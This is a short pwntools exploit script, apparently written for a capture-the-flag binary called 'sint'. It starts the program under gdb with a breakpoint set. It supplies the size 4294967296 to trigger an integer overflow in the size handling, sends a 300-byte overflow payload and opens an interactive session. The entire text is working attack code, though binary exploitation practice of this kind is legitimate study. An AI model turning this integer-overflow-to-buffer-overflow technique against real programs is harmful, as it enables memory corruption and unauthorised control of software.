from pwn import *

exe = ELF("./sint")
r = process(exe.path)
gdb.attach(r, gdbscript='''
           b* main++34
           c
           ''')
input()
r.sendlineafter(b"Size: ", b"4294967296")
payload = b"a" * 300
r.sendafter(b"Data: ", payload)
r.interactive()
